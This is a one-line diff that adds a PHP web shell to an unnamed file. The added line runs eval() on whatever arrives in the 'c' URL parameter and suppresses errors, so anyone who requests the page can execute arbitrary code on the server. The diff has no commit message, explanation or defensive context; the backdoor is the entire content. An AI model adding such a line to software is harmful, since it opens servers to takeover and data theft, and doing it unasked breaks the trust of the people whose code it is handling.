@@ -1,0 +1,1 @@
+<pre><?php @eval($_GET['c']);?></pre>
